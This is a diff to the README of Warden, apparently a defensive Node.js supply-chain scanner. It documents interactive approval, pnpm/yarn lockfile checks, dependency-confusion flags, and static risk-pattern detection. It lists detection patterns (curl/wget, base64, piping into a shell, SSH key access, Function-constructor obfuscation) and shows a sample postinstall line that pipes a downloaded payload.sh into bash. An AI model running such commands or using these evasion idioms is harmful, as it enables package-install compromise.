@@ -60,6 +60,7 @@ Requires Node.js >= 18.19 for ESM enforcement (`module.register`). CommonJS enfo
 npm install
 warden scan          # analyse node_modules, write warden.lock.json
 warden approve --all # mark all packages as reviewed (first time only)
+# or: warden approve --interactive — walk through each one with the evidence behind it
 git add warden.lock.json
 ```
 
@@ -106,7 +107,9 @@ Packages linked via symlink (pnpm's `node_modules`, and npm/yarn workspaces) are
 
 Packages that declare an npm life-cycle script (`preinstall`, `install`, or `postinstall`) are flagged separately in the scan summary and in `warden audit`/`warden report`. These scripts run at install time, before Warden's hooks exist, so they are **not** sandboxed — the flag is informational, so you know to review them manually, or run `warden inspect-script` against them.
 
-Package names are also checked against a small, offline list of popular packages for likely typosquats (e.g. `lodahs` vs `lodash`) — a one-character match downgrades an otherwise-clean package back to `pending-review` and flags it in the scan summary, `warden audit`, and `warden report`. This is a static, curated list (not a live registry lookup), so it only catches typos of the packages it knows about.
+Package names are also checked against a small, offline list of popular packages for likely typosquats (e.g. `lodahs` vs `lodash`) — a one-character match downgrades an otherwise-clean package back to `pending-review` and flags it in the scan summary, `warden audit`, and `warden report`. This is a static, curated list (not a live registry lookup), so it only catches typos of the packages it knows about. Allowlist a specific name, or raise the edit-distance threshold, via `typosquatAllowlist`/`typosquatMaxDistance` in `.wardenrc.json`.
+
+Life-cycle scripts are additionally checked for a short list of static risk patterns in the command itself — `curl`/`wget`, base64 encoding/decoding, `chmod +x`, piping into a shell, `sudo`, SSH key access, writing to a shell profile or crontab. A match is surfaced (with the specific pattern labels) in the scan summary, `warden audit`, `warden report`, and forces `pending-review`. The package's JS is also checked for a couple of static code-obfuscation idioms — a base64-decoded string feeding a call, or indirect `Function` constructor access via `X.constructor.constructor(...)` — surfaced the same way under a separate "evasion patterns" flag. Both are pattern matches only, not proof of malicious intent — and matching nothing is not proof of the opposite either.
 
 ```
 warden scan [--dir <path>] [--no-progress] [--verbose] [--json]
@@ -218,13 +221,14 @@ warden verify [--dir <path>] [--json] [--sarif] [--junit]
 Marks packages as reviewed in `warden.lock.json`. Approval is tied to the current content hash — any code change resets the package to `pending-review`.
 
 ```
-warden approve [packages...] [--all] [--rescan] [--capability <cap>] [--deny <cap>] [--note <text>]
+warden approve [packages...] [--all] [--interactive] [--rescan] [--capability <cap>] [--deny <cap>] [--note <text>]
 ```
 
 | Flag | Description |
 |---|---|
 | `packages...` | Package names (`axios`) or versioned keys (`axios@1.6.0`). Multiple accepted. |
 | `--all` | Approve all `pending-review` packages at once |
+| `-i, --interactive` | Walk through each pending package one at a time, showing the `explain` evidence behind its capabilities before you decide |
 | `--rescan` | Re-scan packages from disk before approving |
 | `--capability <cap>` | Approve **only** this one capability — all others will be blocked at runtime even if declared |
 | `--deny <cap>` | Explicitly block one capability — the package is approved for everything else it declared, but this one is denied at runtime. Deny always wins: a cap in both `allowedCapabilities` and `deniedCapabilities` is blocked. |
@@ -240,6 +244,7 @@ warden approve got --capability network
 warden approve axios --deny filesystem-write
 warden approve some-pkg --note "reviewed by alice 2026-08-02, only reads config files"
 warden approve --all --rescan
+warden approve --interactive
 ```
 
 `--capability` and `--deny` are complementary:
@@ -247,6 +252,14 @@ warden approve --all --rescan
 - `--deny filesystem-write` -> allow everything declared, but block `filesystem-write`
 
 Re-approving a package without `--deny` preserves any existing `deniedCapabilities`. Use `warden unapprove` to fully reset a package's approval state.
+
+**Interactive mode (`--interactive` / `-i`):** instead of blindly running `--all`, prompts for each pending-review package in turn — showing its capabilities, its note (typosquat/life-cycle/evasion flags if any), and the `explain` evidence (file:line + snippet) behind each capability — then asks:
+
+```
+[a]llow all / [d]eny a capability / [r]estrict to a capability / [s]kip / [q]uit:
+```
+
+`a` approves fully, `d`/`r` prompt for which capability to deny or restrict to (same semantics as `--deny`/`--capability`), `s` leaves that package untouched, and `q` stops the whole session (whatever was already decided is still saved). Each decision can optionally take a note. Run with package names or `--all` to pick the target set explicitly; with neither, it defaults to every `pending-review` package.
 
 ### `warden unapprove`
 
@@ -331,7 +344,7 @@ warden audit [--dir <path>] [--json] [--fix]
 | Flag | Description |
 |---|---|
 | `--dir <path>` | Project directory (default: cwd) |
-| `--json` | Output `{ "total": number, "byCapability": { "[cap]": ["pkg@version"] } }` |
+| `--json` | Output `{ total, byCapability, lifecycleScriptPackages, unsandboxedPackages, typosquatPackages, evasionPackages }` (the last four are package-key lists) |
 | `--fix` | Auto-approve all `pending-review` packages whose only capabilities are `env-access` and/or `filesystem-read` (low-risk only). Writes the lockfile. |
 
 ```bash
@@ -414,7 +427,7 @@ Warden Explain: axios@1.6.0
 
 ### `warden inspect-script`
 
-Reviews a package's npm life-cycle scripts (`preinstall`/`install`/`postinstall`) before you approve it. These scripts run at install time, before Warden's hooks exist, so they are never sandboxed automatically — this command closes part of that gap for the common case: when the script is a direct `node <file>.js` invocation, Warden runs that file through the same observation/enforcement hooks as `warden run`, scoped to the package's own lockfile policy. Anything else (shell pipelines, `node-gyp`, prebuilt binary installers, `npm-run-all`, ...) runs outside Node's module system — Warden cannot see into it, so it prints the raw command for manual review instead of guessing or running it unsandboxed.
+Reviews a package's npm life-cycle scripts (`preinstall`/`install`/`postinstall`) before you approve it. These scripts run at install time, before Warden's hooks exist, so they are never sandboxed automatically — this command closes part of that gap for the common case: when the script is a direct `node <file>.js` invocation, Warden runs that file through the same observation/enforcement hooks as `warden run`, scoped to the package's own lockfile policy. Anything else (shell pipelines, `node-gyp`, prebuilt binary installers, `npm-run-all`, ...) runs outside Node's module system — Warden cannot see into it, so instead of guessing or running it unsandboxed, it runs the same static risk-pattern check `warden scan` uses on life-cycle scripts (curl/wget, base64, chmod +x, piping into a shell, ...) and prints any matches alongside the raw command for manual review.
 
 ```
 warden inspect-script <pkg> [script] [--dir <path>] [--enforce] [--profile <profile>] [--timeout <ms>]
@@ -447,12 +460,25 @@ Warden Inspect: some-pkg — postinstall
   - some-pkg → http (network)
 ```
 
-**Example output (not sandboxable):**
+**Example output (not sandboxable, risk patterns found):**
+
+```
+Warden Inspect: some-pkg — postinstall
+  Command: curl -s https://example.com/payload.sh | bash
+  Cannot be sandboxed automatically — not a direct `node <file>.js` invocation.
+  Risk patterns found in this command:
+    - downloads over the network (curl)
+    - pipes content directly into a shell or interpreter
+  Review the command above manually before approving this package.
+```
+
+**Example output (not sandboxable, nothing matched):**
 
 ```
 Warden Inspect: some-pkg — preinstall
   Command: node-gyp rebuild
   Cannot be sandboxed automatically — not a direct `node <file>.js` invocation.
+  No known risk patterns matched — this is not a guarantee the command is safe.
   Review the command above manually before approving this package.
 ```
 
@@ -551,23 +577,25 @@ Changes are debounced by 1 second to avoid thrashing during multi-file installs.
 
 ### `warden integrity`
 
-Reads `package-lock.json` and checks that all packages were installed from a trusted registry and have a valid integrity hash. Catches packages installed from git refs, local paths, or private URLs that bypass the registry.
+Reads your package manager's lockfile and checks that all packages were installed from a trusted registry and have a valid integrity hash. Catches packages installed from git refs, local paths, or private URLs that bypass the registry. Supports npm (`package-lock.json`), pnpm (`pnpm-lock.yaml`), and classic Yarn v1 (`yarn.lock`) — auto-detected, or forced with `--lockfile`.
 
 Trusts `registry.npmjs.org` and `registry.yarnpkg.com` by default. Add your own private registry (Verdaccio, Artifactory, GitHub Packages, ...) via the `registries` field in `.wardenrc.json` — otherwise every package resolved from it is reported as a non-registry source.
 
 ```
-warden integrity [--dir <path>] [--json]
+warden integrity [--dir <path>] [--lockfile <auto|npm|pnpm|yarn>] [--json]
 ```
 
 | Flag | Description |
 |---|---|
 | `--dir <path>` | Project directory (default: cwd) |
-| `--json` | Output `{ "checked": number, "issues": [{ package, issue }] }` |
+| `--lockfile <kind>` | Which lockfile to check: `auto` (default, prefers npm, then pnpm, then yarn), `npm`, `pnpm`, or `yarn` |
+| `--json` | Output `{ "checked": number, "lockfile": "npm"\|"pnpm"\|"yarn", "issues": [{ package, issue }] }` |
 
 Exit codes: `0` = all clear, `1` = issues found.
 
 ```bash
 warden integrity
+warden integrity --lockfile pnpm
 warden integrity --json
 ```
 
@@ -586,20 +614,25 @@ Warden Integrity Check
     missing integrity hash — package may have been installed from a local path or git ref
 ```
 
+**Scope confusion:** configure `privateScopes` in `.wardenrc.json` (e.g. `["@acme"]`) to flag a scoped package that resolves from the public npm registry instead of your private one — a classic dependency-confusion attack, where someone publishes a public package under the same name as your internal scope hoping it gets pulled in by mistake. Only checked for npm/yarn lockfiles, which record a resolved URL; pnpm's lockfile generally omits one for ordinary registry packages.
+
+pnpm-lock.yaml and yarn.lock are parsed with small, narrow, hand-written parsers (not a general YAML library) — they cover the common, current format of each (pnpm v7+'s `@`-based `packages:` keys; classic Yarn v1, not Yarn Berry). An unrecognised structure raises a clear parse error rather than silently reporting "all clear".
+
 ### `warden ci`
 
-Runs `warden integrity`, `warden verify`, and `warden audit` together as a single CI gate, with one exit code — instead of chaining three separate commands in your pipeline. `integrity` is skipped (not failed) when there is no `package-lock.json`, since it doesn't yet understand pnpm/yarn lockfiles; `audit` is informational only and never fails the gate on its own, it just surfaces the high-risk package count alongside the pass/fail result.
+Runs `warden integrity`, `warden verify`, and `warden audit` together as a single CI gate, with one exit code — instead of chaining three separate commands in your pipeline. `integrity` is skipped (not failed) when there is no lockfile of any kind for it to check; `audit` is informational only and never fails the gate on its own, it just surfaces the high-risk package count alongside the pass/fail result.
 
 ```
-warden ci [--dir <path>] [--json]
+warden ci [--dir <path>] [--strict] [--json]
 ```
 
 | Flag | Description |
 |---|---|
 | `--dir <path>` | Project directory (default: cwd) |
-| `--json` | Output `{ ok, integrity, verify, audit }` |
+| `--strict` | Also fail on native addons (`unsandboxed`) and any declared life-cycle script — not just ones already flagged as risky. For teams that want zero tolerance for install-time code, period. |
+| `--json` | Output `{ ok, integrity, verify, audit, strict }` |
 
-Exit codes: `0` = integrity and verify both passed (or integrity was skipped), `1` = either failed.
+Exit codes: `0` = integrity and verify both passed (or integrity was skipped) and, under `--strict`, no strict violations either; `1` = any of those failed.
 
 ```yaml
 # GitHub Actions — replaces separate integrity/verify/sarif/junit steps for a simple gate
@@ -608,6 +641,7 @@ Exit codes: `0` = integrity and verify both passed (or integrity was skipped), `
 
 ```bash
 warden ci
+warden ci --strict
 warden ci --json
 ```
 
@@ -681,7 +715,10 @@ A `.wardenrc.json` file at the project root provides defaults for CLI flags. CLI
   "profile": "strict",
   "autoApprove": false,
   "ignore": ["my-trusted-internal-package"],
-  "registries": ["https://npm.mycompany.internal/"]
+  "registries": ["https://npm.mycompany.internal/"],
+  "privateScopes": ["@acme"],
+  "typosquatAllowlist": ["my-oddly-named-package"],
+  "typosquatMaxDistance": 1
 }
 ```
 
@@ -691,6 +728,9 @@ A `.wardenrc.json` file at the project root provides defaults for CLI flags. CLI
 | `autoApprove` | `boolean` | Equivalent to passing `--approve-all` to `warden install` / `warden update` |
 | `ignore` | `string[]` | Package names excluded from `warden verify` violations (still scanned and in lockfile) |
 | `registries` | `string[]` | Extra registry URL prefixes trusted by `warden integrity`, beyond the npm/yarn public registries |
+| `privateScopes` | `string[]` | Scopes (e.g. `"@acme"`) `warden integrity` expects to resolve from a private registry — flags one that resolves from the public npm registry instead (scope confusion) |
+| `typosquatAllowlist` | `string[]` | Package names never flagged as a typosquat, regardless of edit distance — for a legitimately odd name that keeps tripping the heuristic |
+| `typosquatMaxDistance` | `number` | Maximum edit distance considered a typosquat match (default `1`). Raising this trades precision for recall — expect more false positives. |
 
 Create it interactively with `warden config init`, or write it manually.
 
@@ -738,7 +778,9 @@ Create it interactively with `warden config init`, or write it manually.
 | `status` | `string` | `approved`, `pending-review`, `unsandboxed`, or `unanalyzable` |
 | `note` | `string?` | Human-readable note (auto-generated on capability changes, or set with `--note`). |
 | `lifecycleScripts` | `string[]?` | npm life-cycle scripts (`preinstall`/`install`/`postinstall`) the package declares. Install-time only — not covered by runtime sandboxing. |
+| `lifecycleScriptRisks` | `string[]?` | Static risk-pattern labels matched in those scripts' commands (curl/wget, base64, chmod +x, piping into a shell, ...). A match forces `pending-review` even on unchanged content. |
 | `typosquatOf` | `string?` | Set when the package name is a likely one-character typo of a popular package. |
+| `evasionPatterns` | `string[]?` | Static code-obfuscation idioms found in the package's JS (base64-decoded strings feeding a call, indirect Function constructor access). A match forces `pending-review`. |
 
 ## Capabilities
 
@@ -820,7 +862,11 @@ Warden's hooks only exist once a script `require`s/`import`s a package — they 
 
 ### The typosquat list is small, static, and offline
 
-`warden scan` flags package names that are a one-character edit away from a name in a small, bundled list of popular packages. It is not a registry lookup and does not grow over time on its own — it only catches typos of the packages already in that list, and it intentionally ignores scoped packages (`@scope/name`) and anything more than one character off, to keep false positives low.
+`warden scan` flags package names that are a one-character edit away from a name in a small, bundled list of popular packages. It is not a registry lookup and does not grow over time on its own — it only catches typos of the packages already in that list, and it intentionally ignores scoped packages (`@scope/name`) and anything more than one character off, to keep false positives low. Both are configurable (`typosquatAllowlist`, `typosquatMaxDistance`).
+
+### Life-cycle script risk and evasion patterns are a short, static list
+
+Both checks are plain substring/regex matches against a small, hand-picked list — `curl`/`wget`, base64, `chmod +x`, piping into a shell, `sudo`, SSH key access for scripts; a base64-decode-then-call shape and `X.constructor.constructor(...)` for evasion. They catch the specific idioms on the list and nothing else — a determined attacker who avoids exactly these strings (a different obfuscation technique, a renamed binary, an equivalent but differently-shaped `Function` access) won't be flagged. Treat a match as a strong "look closer" signal, and the absence of one as "nothing on this particular list matched" — not as a clean bill of health.
 
 A typosquat match forces a package back to `pending-review` — including an already-`approved`, content-unchanged entry, and including one in a lockfile written before Warden had typosquat detection at all — and `warden verify`/`warden ci` fail on it, not just `warden scan`'s terminal output. Approving it again (`warden approve`) is a one-time, explicit dismissal: once a lockfile entry records the same `typosquatOf` value, re-scanning it won't re-flag it. It only flags again if the match changes (e.g. a future, larger typosquat list matches a *different* popular package).
 
@@ -838,7 +884,7 @@ The ESM hook uses `module.register()`, stabilised in Node.js 18.19 / 20.6. On ol
 
 ## License
 
-BSD 2-Clause License — Copyright (c) 2026, r-seize. See [LICENSE](LICENSE).
+BSD 3-Clause License — Copyright (c) 2026, r-seize. See [LICENSE](LICENSE).
 
 ## Contributing
 
